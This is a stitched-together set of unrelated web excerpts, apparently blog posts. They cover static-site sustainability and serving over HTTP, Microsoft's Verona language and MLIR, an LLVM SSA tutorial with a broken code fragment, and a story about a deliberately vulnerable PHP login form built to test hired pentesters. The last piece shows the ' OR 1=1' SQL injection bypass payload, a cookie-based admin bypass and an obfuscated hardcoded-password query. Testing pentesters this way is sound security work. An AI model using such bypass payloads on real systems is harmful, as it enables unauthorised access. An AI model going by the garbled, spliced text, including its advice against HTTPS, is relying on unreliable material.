site to a new server, you need to export the WordPress database from
MySQL on the old server, setup MySQL on the new server and import the
old database. This may not be a huge effort, but it is not as simple,
neither physically nor mentally, as a copying a folder; thus it lowers
the sustainability of the site.<br>
</p>
      <h4>Jekyll<br>
      </h4>
      <p>On the other hand, a <em>generated</em> folder of static HTML files
is not sustainable just because it can easily be copied to a new server
without having to worry about "invisible" databases. While it is easy
to migrate the site to a new server, it is <em>not</em> effortless to
update the contents of the site, because you can't re-generate a Jekyll-driven site
if you don't have Jekyll installed on the computer. Furthermore, it
is not uncommon for there to be differences in behavior between
different versions of the same generator, making it difficult to
maintain the site over long periods of time; if new versions of your
static site generator introduce breaking changes, your site is not
sustainable, because you will have to update its code whenever you
update the generator.</p>
      <h4>HTTPS<br>
      </h4>
      <p>Sustainability
is also the one of the many reasons why my web site is served
over HTTP and not HTTPS. The problem with HTTPS is that you need to get
a certificate from a trusted authority, which either costs
money or is free but needs to be updated every month, and even if you
pay for it, you need to renew the certificate every year or so. If the
operation of your blog
depends on a monthly certificate renewal from Let's Encrypt – even if
the renewal is set up to be automatic – it is less sustainable
than
serving your site over HTTP. HTTP will <em>always</em> be around, will always be supported and will never require a certificate.</p>
      <p>Another problem with HTTPS is that it is very difficult to
revert back to HTTP once you have started using HTTPS. Every outside link to
your web site will be incorrect, and you can't redirect HTTPS traffic
to HTTP without a valid certificate. In other words, once you start
using HTTPS, you will be forever dependent on the certificate renewal
process.</p><p><span color="#cc0000"><b>T</b><b>he more a web site resembles a folder of ungenerated, static HTML files, served over HTTP, the more sustainable it is.</b></span>
As long as the web exists, there will be web servers capable of serving
static HTML files without requiring any extra setup; static HTML is
foolproof. With that said, there are other things you can generally count
on being available without extra setup. One such thing is PHP. A folder
of <em>mostly</em> static HTML pages, enhanced by PHP includes, is nearly as sustainable as a folder of completely static HTML pages.</p>
      
      <h3>Second criterion: power</h3>
      <p>The second criterion, power, corresponds to the following question:</p>
      <blockquote>
        <p>How limited am I in my creation and maintenance of<br>
&nbsp;&nbsp;&nbsp; a) the structure of the entire site, and<br>
&nbsp;&nbsp;&nbsp; b) any given page on the site?</p></blockquote>
      <p>This
is also a rather important rule in my life, at least as far as
technology is concerned. I like doing things the way I like doing them,
especially when it comes to a creative endeavor – which building a web
site is. I don't like to be hindered by the software I use, unless the
software is good enough to outweigh the irratation provoked by its
limitations.<br>
      </p>
      <blockquote>
      </blockquote>

      <h4>Streamlining<br>
      </h4>
      <p>To be fair, to make the creation and maintenance of a site easier and more
powerful in some regards, it seems necessary to introduce limitations
in other regards. For example, if I want an identical navigation menu
on every page, it is wise to use a PHP include or some type of
templating engine; but this, in turn, limits my power to customize the
navigation menu of each page specifically according to that page's
needs. In streamlining the site's navigation menu, some freedom is lost.<br>
      </p>
      <p>This
type of streamlining is not a bad idea. The problem with
most content management systems and static site generators is that they
streamline too much. If I implement a common navigation menu by putting
a PHP include on every page that needs it, then I can choose <em>not</em>
to include it on any given page. But if I implement the navigation menu
by enforcing a single common template for all pages – which is what
most CMSs and SSGs do – then I can not nearly as easily choose <em>not</em>
to include the navigation menu on some of the pages. If I need to do
so, it is possible, but I am forced to work around the system.</p><h4>Structure<br>
      </h4>
      
      <p>Likewise, static site generators like Jekyll usually make it <em>very</em>
hard to freely choose a directory structure for your site. They are
almost always built for very simple purposes: all blog posts go in <i>_posts</i>, and more complex directory structures are usually very difficult to implement, if not impossible. CMSs
are generally more flexible, but they too can be difficult to bend to
your specific needs. Ultimately, in terms of flexibility, a folder of
static, ungenerated HTML beats everything else, especially when
combined with an <i>.htaccess</i> file.<br>
      </p>
      <h4>Markup language<br>
      </h4>
      <p>CMSs
and SSGs share the tendency to avoid plain HTML: most
CMSs use a WYSIWYG editor, while SSGs usually use Markdown. This is an
obvious and severe limitation: many things in this very article – such
as the red text or the right-aligned headings – are impossible to write
in Markdown (without reverting to actual HTML inside the Markdown
document). But as I mentioned in my original post, there are actually
HTML editors that don't suck, even WYSIWYG editors. I am using <a href="http://kompozer.sourceforge.net/">KompoZer</a>, one such editor, to write this very post.</p><p><span color="#cc0000"><b>If you use a CMS or SSG, you constantly have to battle its limitations.</b></span>
You should consider whether its benefits are great enough to justify
this struggle. They might be – but I suspect that, for many
technologically talented people, they are not.<br>
</p>
      <h3>My current solution</h3>
      <p>Perhaps my own web
site (the one you're visiting right now) can serve as inspiration as to
how to build a web site according to these criteria. It is currently
implemented in the following way:<br>
      </p>
      <ul>
        <li>
          <p>The site is a folder of <em>mostly</em> static HTML files, enhanced by zero, one or two PHP includes, depending on the page:</p>
        </li>
        <ul>
          <li>Navigation menu</li>
          <li>Comments section</li>
        </ul>
        <p>The
comments system, written in PHP, works by
appending new comments to an HTML file located in the same directory as
the page
being commented on. This HTML file is included via PHP on the page.
This system is not nearly as efficient as a database-driven one, but it
is drastically more sustainable<small><big>. (You can try out the system
below.)</big><br>
        </small></p>
        <li>
          <p>I have an <a href="http://john.ankarstrom.se/articles.xml">RSS feed</a>
implemented as a PHP script, which pulls the posts to include in the
feed from the site's front page and subsequently extracts the contents
of each post from their respective file. The front page is updated
manually.<br>
</p>
        </li>
        <li>
          <p>All files upon which the various pages on the site depend – the stylesheet,
the navigation menu script and the comments script – are put in a
folder at the site's root named <i>1</i>. If I ever choose to re-write the site, I can keep this <i>1</i>
folder, so that the old pages still work, and put the new files, like
the stylesheets and scripts for the new pages, into another folder
named <i>2</i> – and so on forever.</p>
        </li>
        <p><small>In
my initial article, I put forward the idea of
putting all files upon which a page depends in that page's directory.
Pages would then be self-contained. I ultimately decided against this,
because a) it is useful&nbsp;for some pages to share some common files,
such as a stylesheet, and b) if the stylesheet always resides at the
same URL, browsers will save it in the cache. </small></p>
      </ul>
      <p>As you can see, I have introduced some dynamism to the site,
most notably the comments system. (It has bothered me that very few
blogs support comments nowadays. How am I supposed to respond to a blog post?
E-mail the author? What …</p></div></td></div></div>

<p><a href="https://github.com/microsoft/verona">Verona</a> is a new language being developed by <a href="https://www.microsoft.com/en-us/research/lab/microsoft-research-cambridge/">Microsoft Research Cambridge</a> which explores the concept of concurrent ownership.&nbsp;Accessing shared memory in a thread-safe manner needs all sorts of atomic access controls. While modern CPUs implement cache locality and atomic instructions (in addition to previous generation’s inefficient catch-all barriers), such fine control is only meaningful for small objects (usually register sized). </p>



<p>If you want to share large areas of (concurrently) mutable memory, you generally introduce the idea of locks, and with that, comes dead-locks, live-locks and all sorts of memory corruption problems. Alternatives, like message passing, exist for a number of decades, but they’re usually efficient for (again) small objects. It’s quite inefficient to send MB or GB sized mutable blobs in messages.</p>



<p>Verona aims to fix that by passing the <em>ownership</em> of a mutable region of memory as a message instead. The message queues are completely lock-free (using Atomic-Swap lock-free data structures) and only pass the <em>entry-point</em> to a region (an <em>isolated</em> reference to the whole mutable memory blob) as the unique ownership. Meaning only the thread that has that <em>isolated</em> object can access any memory in the region contained within. So each thread has the strong guarantee that no one else is accessing the entire region and there are no chances of concurrent mutation and no need for locks.</p>



<p><a href="https://mlir.llvm.org/">MLIR</a> is a multi-level intermediate representation developed within the <a href="https://www.tensorflow.org/">TensorFlow</a> project but later migrated under the <a href="https://llvm.org/">LLVM</a> umbrella. As a core part of the LLVM project, MLIR is being used in a lot more than just ML representations and is gaining <a href="https://mlir.llvm.org/users/">traction</a> as the high-level representation of some language front-ends (<a href="https://github.com/llvm/llvm-project/tree/master/flang">Fortran</a>, <a href="https://github.com/llvm/circt">Hardware description</a>) and other experiments bringing Clang to use MLIR as its own intermediate language.</p>



<p>The main benefit of using MLIR for language lowering is that you can keep the language semantics as high level as you need, by constructing <em>dialect</em> operations that encode the logic you want, and then creating passes that use those operations to infer behaviour and types or to transform into a more optimal format, before lowering to the <em>standard</em> dialects and further down, LLVM IR.</p>



<p>This fixes the two big problems in front-ends: on the one hand, it’s a lot easier to work with flexible IR operations than <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">AST</a> (abstract syntax tree)  nodes, and on the other hand, we only lower to LLVM IR (which is very low level) when we’re comfortable we can’t extract any more <em>special</em> behaviour from the language semantics. Other existing dialects add to the list of benefits, as they already have rich semantics and existing optimisation passes we can use for free.</p>



<h4>Why Verona needs MLIR</h4>



<p>Verona aims to be easy to program but powerful to express concurrent and rich type semantics without effort. However, Verona’s type system is far from <em>simple</em>. C-like languages usually have <em>native</em> types (integer, float, boolean) that can be directly represented in hardware, or are simple to be operated by a runtime library; and <em>container</em> types (lists, sets, queues, iterators), which offer different views and access on native types. Some languages also support <em>generics</em>, which is a parametrisation of some types on other types, for example, a container of <em>any</em> type, to be defined <em>later</em>.</p>



<p>Verona has all of that, plus:</p>



<ol><li><strong>Type capabilities (mutable, immutable, isolated).</strong> Controlling the access to objects with regards to mutability (ex. immutable objects are stored in immutable memory outside of mutable regions) as well as region sentinels (isolated) that cannot be held by more than one reference from outside the region.</li><li><strong>Type unions (A | B)</strong>. This feature allows users to create functionality that works with multiple types, allowing easy restriction on the types passed and matching specific types in the code (via keyword <code>match</code>) with the guarantee that the type will be one of those.</li><li><strong>Type intersections (A &amp; B).</strong> This allows restricting types with capabilities, making it harder to have unexpected access, for example, returning immutable references or identifying isolated objects on creation. It can also help designing interfaces, creating requirements on objects (ex. to be both <em>random-access</em> and an <em>ordered</em> collection). But also as function arguments, controlling the access to received objects.</li><li><strong>Strong inferred types.</strong> The compiler will emit an error if types cannot be identified at compile time, but users don’t need to declare them everywhere, and sometimes they can’t even be known until the compiler runs its own type inference pass (ex. <em>generics</em>, <em>unions</em>, or <em>lambdas</em>).</li></ol>



<p>Verona currently uses a <a href="https://en.wikipedia.org/wiki/Parsing_expression_grammar">PEG</a> parser that produce the AST and is quite straight forward, but once it’s constructed, working with ASTs (more specifically creating new nodes, replacing or updating existing ones) is quite involved and error prone. MLIR has some nice properties (<a href="https://en.wikipedia.org/wiki/Static_single_assignment_form">SSA form</a>, dialect operations, regions) that make that work much easier to change. But more importantly, the IR has explicit control flow (<a href="https://en.wikipedia.org/wiki/Control-flow_graph">CFG</a>), which is important for tracking where variables come from, pass through all combinations of paths, and ultimately end up at. To infer types and check safety, this is fundamental to make sure the code can’t get to an unknown state through at least one of the possible paths.</p>



<p>So, the main reason why we chose MLIR to be our representation is so we can do our type inference more easily.</p>



<p>The second reason is that MLIR allows us to mix any number of dialects together. So we can lower the AST into a mix of Verona dialect and other standard dialects, and passes that can only see Verona operations will ignore the others and vice-versa. It also allows us to partially lower parts of the dialect into other dialects without having to convert the whole thing. This keep the code clean (short, to-the-point passes) and allows us to slowly build more information, without having to run a huge analysis pass followed by a huge transformation pass, only to lose information in the middle.</p>



<p>An unexpected benefit of MLIR was that it has native support for <em>opaque</em> operations, ie. function-call-like operations that don’t need defining anywhere. This allowed us to prototype the dialect even before it existed, and was the precursor of some of our current dialect operations. We’re still using opaque nodes where the dialect is not complete yet, allowing us to slowly build the dialect without having to rush through (and fail at) a long initial design phase.</p>



<h4>Where are we at</h4>



<p>Right now, we have a <a href="https://github.com/microsoft/verona/blob/master/src/mlir/dialect/VeronaOps.td">dialect</a>, a simple and incomplete MLIR <a href="https://github.com/microsoft/verona/blob/master/src/mlir/generator.cc">generator</a> and a few <a href="https://github.com/microsoft/verona/tree/master/testsuite/mlir/mlir-parse">examples</a>. None of those examples can be lowered to LLVM IR yet, as we don’t have any partial conversion to other standard dialects. Once we have a bit more support for the core language, and we’re comfortable that the dialect is at the right level of abstraction, we’ll start working on the partial conversion.</p>



<p>But, like other <a href="https://mlir.llvm.org/docs/Tutorials/Toy/">examples</a> in MLIR, we’ll have to hold on to strings and printing in our own dialect until it can be lowered directly to the LLVM dialect. This is because MLIR has no native string representation and there is no <em>sane</em> way of representing all types of strings in the existing types.</p>



<p>Other missing important functionality are:</p>



<ul><li><code>when</code> keyword, which controls access to the regions (requests ownership),</li><li><code>match</code> keyword, which controls the types (ex. from a type union) in the following block,</li><li><code>lambda</code> and <code>literal</code> objects, which will create their own capture context via anonymous structures and expose a function call.</li></ul>



<p>We also need to expose some minimal runtime library written in Verona to operate on types (ex. integer/floating-point arithmetic and logic), and we need those classes compiled and exposed to user code as an MLIR module, so that we can look at the code as a whole and do more efficient optimisations (like inlining) as well as pattern-matching <em>known</em> operations, like addition, and lower them to native LLVM instructions (ex. <code>add</code> or <code>fadd</code>).</p>



<h4>Here be dragons</h4>



<p>While we’re always happy to accept issues and pull requests, the current status of the language is raw. We’re co-designing the language, the compiler and the runtime library, as well as its more advanced features such as its <a href="https://github.com/microsoft/verona/tree/master/experiments/clang_interface">clang interface</a> and <a href="https://github.com/microsoft/verona/tree/master/experiments/process_sandbox">process sandbox</a>. All of which would need multiple additional blog posts to cover, and all in continuous discussions to define both syntax and semantics.</p>



<p>By the time we have some LLVM IR generated and hopefully some execution of a simple program, the parser, compiler and libraries will be a bit more stable to allow external people to not only play with it by contribute back.</p>



<p>What would be extremely helpful, though, are tough questions about the language’s behaviour, our own expectations and the API that is exposed to programmers by the runtime. There are a lot of unknowns and until we start writing some serious Verona code, we won’t know for sure what works better. If you’re feeling brave, and would like to create issues with examples of what you would like to see in the language, that’d be awesome.</p>



<p>Also issues (and even pull requests) on the existing implementation would be nice, with recommendations of better patterns on our usage of the external libraries, for example MLIR, which is in constant evolution on its own, and we can’t keep up with every new shiny feature.</p>



<p>So, patches welcome, but bring your dragon-scale armour, shield and fire resistance spells.</p>

<p><em>With thanks to <a href="https://twitter.com/inventednight/">Niki Carroll</a>, winny, and kurufu for their
invaluable proofreading and advice.</em></p>

<h2 id="preword">Preword</h2>

<p>By <a href="https://twitter.com/8x5clPW2/status/1311316978703970307">popular demand</a>, I’m doing another
LLVM post. This time, it’s <strong>single static assignment</strong> (or SSA) form, a common feature
in the intermediate representations of optimizing compilers.</p>

<p>Like <a href="https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">the last one</a>, SSA is a
topic in compiler and IR design that I <em>mostly</em> understand but could benefit from some self-guided
education on. So here we are.</p>

<h2 id="how-to-represent-a-program">How to represent a program</h2>

<p>At the highest level, a compiler’s job is singular: to turn some source language <em>input</em>
into some machine language <em>output</em>. Internally, this breaks down into a sequence of clearly
delineated<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> tasks:</p>

<ol>
  <li><strong>Lexing</strong> the source into a sequence of tokens</li>
  <li><strong>Parsing</strong> the token stream into an <strong>abstract syntax tree</strong>, or AST<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Validating</strong> the AST (e.g., ensuring that all uses of identifiers are consistent with the
source language’s scoping and definition rules)<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
  <li><strong>Translating</strong> the AST into machine code, with all of its complexities (instruction selection,
register allocation, frame generation, &amp;c)</li>
</ol>

<p>In a <strong>single-pass</strong> compiler, (4) is monolithic: machine code is generated as the compiler walks
the AST, with no revisiting of previously generated code. This is extremely fast (in terms of
compiler performance) in exchange for some a few significant limitations:</p>

<ul>
  <li>
    <p>Optimization potential: because machine code is generated in a single pass, it can’t be revisited
for optimizations. Single-pass compilers tend to generate extremely slow and <em>conservative</em>
machine code.</p>

    <p>By way of example: the
  <a href="https://raw.githubusercontent.com/wiki/hjl-tools/x86-psABI/x86-64-psABI-1.0.pdf">System V ABI</a>
  (used by Linux and macOS) defines
  <a href="https://en.wikipedia.org/wiki/Red_zone_(computing)">a special 128-byte region</a> beyond the
  current stack pointer (<code>%rsp</code>) that can be used by leaf functions whose stack frames fit within
  it. This, in turn, saves a few stack management instructions in the function prologue and
  epilogue.</p>

    <p>A single-pass compiler will struggle to take advantage of this ABI-supplied
  optimization: it needs to emit a stack slot for each automatic variable as they’re visited,
  and cannot revisit its function prologue for erasure if all variables fit within the red zone.</p>
  </li>
  <li>
    <p>Language limitations: single-pass compilers struggle with common language design decisions, like
allowing use of identifiers before their declaration or definition. For example, the following
is valid C++:</p>

    <div><div><pre><code>  <span>class</span> <span>Rect</span> <span>{</span>
  <span>public:</span>
    <span>int</span> <span>area</span><span>()</span> <span>{</span> <span>return</span> <span>width</span><span>()</span> <span>*</span> <span>height</span><span>();</span> <span>}</span>
    <span>int</span> <span>width</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
    <span>int</span> <span>height</span><span>()</span> <span>{</span> <span>return</span> <span>5</span><span>;</span> <span>}</span>
  <span>};</span>
</code></pre></div>    </div>

    <p>C and C++ <em>generally</em> require pre-declaration and/or definition for identifiers, but
  member function bodies may reference the entire class scope. This will frustrate a
  single-pass compiler, which expects <code>Rect::width</code> and <code>Rect::height</code> to already exist
  in some symbol lookup table for call generation.</p>
  </li>
</ul>

<p>Consequently, (virtually) all modern compilers are <strong>multi-pass</strong>.</p>

<p><img src="https://blog.yossarian.net/assets/multipass.jpg" alt="Pictured: Leeloo Dallas from The Fifth Element holding up her multi-pass.">
<em>“multi-pass” — Leeloo Dallas</em></p>

<p>Multi-pass compilers break the <em>translation</em> phase down even more:</p>

<ol>
  <li>The AST is lowered into an <strong>intermediate representation</strong>, or IR</li>
  <li>Analyses (or passes) are performed on the IR, refining it according to some optimization
profile (code size, performance, &amp;c)</li>
  <li>The IR is either translated to machine code <em>or</em> lowered to <em>another</em> IR, for further target
specialization or optimization<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
</ol>

<p>So, we want an IR that’s easy to <em>correctly</em> transform and that’s amenable to optimization. Let’s
talk about why IRs that have the <strong>static single assignment</strong> property fill that niche.</p>

<h2 id="ssa-form">SSA form</h2>

<p>At its core, the SSA form of any program source program introduces only one new constraint:
all variables are assigned (i.e., stored to) <strong>exactly once</strong>.</p>

<p>By way of example: the following (not actually very helpful) function is <strong>not</strong> in a valid SSA form
with respect to the <code>flags</code> variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags</span> <span>|=</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Why? Because <code>flags</code> is stored to twice: once for initialization, and (potentially) again inside
the conditional body.</p>

<p>As programmers, we could rewrite <code>helpful_open</code> to only ever store once to each automatic variable:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span> <span>else</span> <span>{</span>
    <span>int</span> <span>flags</span> <span>=</span> <span>O_RDWR</span><span>;</span>
    <span>return</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags</span><span>,</span> <span>0644</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>But this is clumsy and repetitive: we essentially need to duplicate every chain of uses that
follow any variable that is stored to more than once. That’s not great for readability,
maintainability, or code size.</p>

<p>So, we do what we always do: make the compiler do the hard work for us. Fortunately there exists
a transformation from every valid program into an equivalent SSA form, conditioned on two simple
rules.</p>

<blockquote>
  <p>Rule #1: Whenever we see a store to an already-stored variable, we replace it with a brand
new “version” of that variable.</p>
</blockquote>

<p>Using rule #1 and the example above, we can rewrite <code>flags</code> using <code>_N</code> suffixes to indicate versions:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
  <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

  <span>// Declared up here to avoid dealing with C scopes.</span>
  <span>int</span> <span>flags_1</span><span>;</span>
  <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
    <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
  <span>}</span>

  <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_1</span><span>,</span> <span>0644</span><span>);</span>

  <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>But wait a second: we’ve made a mistake!</p>

<ul>
  <li><code>open(..., flags_1, ...)</code> is incorrect: it unconditionally assigns <code>O_CREAT</code>, which wasn’t in the
original function semantics.</li>
  <li><code>open(..., flags_0, ...)</code> is <strong>also</strong> incorrect: it <em>never</em> assigns <code>O_CREAT</code>, and thus
is wrong for the same reason.</li>
</ul>

<p>So, what do we do? We use rule 2!</p>

<blockquote>
  <p>Rule #2: Whenever we need to <em>choose</em> a variable based on control flow, we use the Phi function
(φ) to introduce a <strong>new</strong> variable based on our choice.</p>
</blockquote>

<p>Using our example once more:</p>

<div><div><pre><code><span>int</span> <span>helpful_open</span><span>(</span><span>char</span> <span>*</span><span>fname</span><span>)</span> <span>{</span>
    <span>int</span> <span>flags_0</span> <span>=</span> <span>O_RDWR</span><span>;</span>

    <span>// Declared up here to avoid dealing with C scopes.</span>
    <span>int</span> <span>flags_1</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span><span>access</span><span>(</span><span>fname</span><span>,</span> <span>F_OK</span><span>))</span> <span>{</span>
      <span>flags_1</span> <span>=</span> <span>flags_0</span> <span>|</span> <span>O_CREAT</span><span>;</span>
    <span>}</span>

    <span>int</span> <span>flags_2</span> <span>=</span> <span>φ</span><span>(</span><span>flags_0</span><span>,</span> <span>flags_1</span><span>);</span>

    <span>int</span> <span>fd</span> <span>=</span> <span>open</span><span>(</span><span>fname</span><span>,</span> <span>flags_2</span><span>,</span> <span>0644</span><span>);</span>

    <span>return</span> <span>fd</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Our quandary is resolved: <code>open</code> <strong>always</strong> takes <code>flags_2</code>, where <code>flags_2</code> is a fresh SSA variable
produced applying φ to <code>flags_0</code> and <code>flags_1</code>.</p>

<p>Observe, too, that φ is a <strong>symbolic</strong> function: compilers that use SSA forms internally do not
emit real φ functions in generated code<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup>. φ exists <em>solely</em> to reconcile rule #1 with the
existence of control flow.</p>

<p>As such, it’s a little bit silly to talk about SSA forms with C examples (since C and other
high-level languages are what we’re translating from in the first place). Let’s dive into how
LLVM’s IR actually represents them.</p>

<h2 id="ssa-in-llvm">SSA in LLVM</h2>

<p>First of all, let’s see what happens when we run our very first <code>helpful_open</code> through <code>clang</code>
with no optimizations:</p>

<span>}</span>
</code></pre></div></div>

<p><em>(View it on <a href="https://godbolt.org/z/6ea8Pq">Godbolt</a>.)</em></p>

<p>So, we call <code>open</code> with <code>%3</code>, which comes from…a <code>load</code> from an <code>i32*</code> named <code>%flags</code>?
Where’s the φ?</p>

<p>This is something that <em>consistently</em> slips me up when reading LLVM’s IR: only <em>values</em>,
<strong>not</strong> memory, are in SSA form. Because we’ve compiled with optimizations disabled, <code>%flags</code> is
just a stack slot that we can <code>store</code> into as many times as we please, and that’s <em>exactly</em> what
LLVM has elected to do above.</p>

<p>As such, LLVM’s SSA-based optimizations aren’t all that useful when passed IR that makes direct
use of stack slots. We want to <em>maximize</em> our use of SSA variables, whenever possible, to make
future optimization passes as effective as possible.</p>

<p>This is where <a href="https://llvm.org/docs/Passes.html#mem2reg-promote-memory-to-register"><code>mem2reg</code></a> comes in:</p>

<blockquote>
  <p>This file (optimization pass) promotes memory references to be register references. It promotes
alloca instructions which only have loads and stores as uses. An alloca is transformed by using
dominator frontiers to place phi nodes, then traversing the function in depth-first order to
rewrite loads and stores as appropriate. This is just the standard SSA construction algorithm to
construct “pruned” SSA form.</p>
</blockquote>

<p>(Parenthetical mine.)</p>

<p><code>mem2reg</code> gets run at <code>-O1</code> and higher, so let’s do exactly that:</p>

<div><div><pre><code><span>define</span> <span>dso_local</span> <span>i32</span> <span>@helpful_open</span><span>(</span><span>i8</span><span>*</span> <span>nocapture</span> <span>readonly</span> <span>%fname</span><span>)</span> <span>local_unnamed_addr</span> <span>#0</span> <span>{</span>
<span>entry:</span>
  <span>%call</span> <span>=</span> <span>call</span> <span>i32</span> <span>@access</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>0</span><span>)</span> <span>#4</span>
  <span>%tobool.not</span> <span>=</span> <span>icmp</span> <span>eq</span> <span>i32</span> <span>%call</span><span>,</span> <span>0</span>
  <span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
  <span>%call1</span> <span>=</span> <span>call</span> <span>i32</span> <span>(</span><span>i8</span><span>*,</span> <span>i32</span><span>,</span> <span>...)</span> <span>@open</span><span>(</span><span>i8</span><span>*</span> <span>%fname</span><span>,</span> <span>i32</span> <span>%spec.select</span><span>,</span> <span>i32</span> <span>420</span><span>)</span> <span>#4</span><span>,</span> <span>!dbg</span> <span>!22</span>
  <span>ret</span> <span>i32</span> <span>%call1</span><span>,</span> <span>!dbg</span> <span>!23</span>
<span>}</span>
</code></pre></div></div>

<p>Foiled again! Our stack slots are gone thanks to <code>mem2reg</code>, but LLVM has actually optimized
<em>too far</em>: it figured out that our flags value is wholly dependent on the return value of our
<code>access</code> call and erased the conditional entirely.</p>

<p>Instead of a φ node, we got this <code>select</code>:</p>

<div><div><pre><code><span>%spec.select</span> <span>=</span> <span>select</span> <span>i1</span> <span>%tobool.not</span><span>,</span> <span>i32</span> <span>66</span><span>,</span> <span>i32</span> <span>2</span>
</code></pre></div></div>

<p>which the <a href="https://llvm.org/docs/LangRef.html#select-instruction">LLVM Language Reference</a>
describes concisely:</p>

<blockquote>
  <p>The ‘select’ instruction is used to choose one value based on a condition, without IR-level branching.</p>
</blockquote>

<p>So we need a better example. Let’s do something that LLVM can’t trivially optimize into a
<code>select</code> (or sequence of <code>select</code>s), like adding an <code>else if</code> with a function that we’ve …</p></div>

<h2><span color="#383b3d">The Story of How I Hired 7 Freelancers to Exploit this Weird Vulnerability</span></h2>

<p>Penetration testing is complex. For it to be successful, the tester needs to possess a variety of different abilities and skills. Some testers rely only on automated tools, while others focus more on manual analysis. While a creative and unconventional way of thinking is necessary, it is also important for the tester to possess the mental discipline to adhere to the time constraints set by the client. It is common for a creative penetration tester to spend a significant amount of time investigating a fun and uncommon exploit, only to realize later that there is not enough time left to provide complete coverage. It is, therefore, not surprising that two different testers will produce two separate reports that include different findings.</p>

<p>I decided to run a little experiment to see how different the reports of different testers would be. I purposely created a vulnerable web application, and hired seven different freelancers to conduct penetration testing against it. I found this to be an excellent opportunity to evaluate the skills of freelancers that provide their services at an extremely low price in online marketplaces. While the cost of penetration testing can be pretty high (typically between $1,000 and $100,000+), these freelancers provide their security services for less than $100. Some of them claim to possess industry-accepted certificates, and I was curious to know the quality of their work, in particular when their services are reviewed positively by thousands of buyers.</p>

  <figcaption>The vulnerable web form</figcaption>
</figure>


<p>
To keep things simple, I created a PHP login form that included two critical vulnerabilities that could be exploited to bypass the authentication form. While these bugs were not hard to discover or exploit, they required manual analysis; a tester that relies only on automated tools would not be able to identify them.
</p>

<p>
The first vulnerability on the form stems from a bug in session management. During the login operation of the web application, even if the credentials are wrong, the application is including the following header in the HTTP response: <span color="crimson">Set-Cooki auth=195c530a7af5f492a74499e70578d150</span>. A careful penetration tester that manually examines the HTTP response should be able to recognize that there is a typo in the name of the "Set-Cookie" header, hence the browser will not automatically set the cookie value. By setting this cookie value manually, the tester will gain admin privileges.
</p>

  <figcaption>Identifying the two vulnerabilities after intercepting the HTTP traffic with Burp Suite</figcaption>
</figure>



<p>
The second way to bypass the authentication of the form is by inputting "<span color="crimson">' OR 1=1'</span>" or a similar payload. The root cause of this issue appears to be an SQL Injection vulnerability, but it is, in fact, a hardcoded SQL password. The executed SQL query can be found in the HTTP response:
</p>


<pre><code> SELECT * FROM form_passwords 
WHERE 'password' 
LIKE CONCAT(
	'%', 
	IF(STRCMP(SYSTEM_USER(), '/dev/random@localhost')=-1, REVERSE(" \'"), 
	ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), 
	IF(STRCMP(SESSION_USER(), '/dev/null@localhost')=0, CHAR(40*2-POWER(1, LOG(2)),(4*10+1)*2), 
	CHAR(69,4*10+9)), SPACE(1), '%' ,'\'','%',IF(STRCMP(VERSION(), '10.3.15-MariaDB-0+deb10u1')=0,
	IF(CONNECTION_ID()=1337,"'"="",'-_-'),
	IF(PI()&lt;3,"&lt;(^^)&gt;","'=")), MID("```'`''`'`'`'``'`'``'```````'`'`'`'`'`''`'`'`",7,1), '%');

</code>
</pre>

<p>
The tester will have to de-obfuscate the SQL query in order to extract the hardcoded password. For the tester to de-obfuscate the SQL query, he needs to possess basic knowledge of SQL syntax. This particular SQL query that I created is using nested inline IF statements. The conditions are checking the environmental variables <span color="crimson">SYSTEM_USER</span>, <span color="crimson">SESSION_USER</span> and <span color="crimson">VERSION</span>). Since these values are not known to the tester, he will have to follow all the different logic paths until the constructed query makes sense. Some simple simplifications here and there can make the query much more readable.


</p>


<figure>
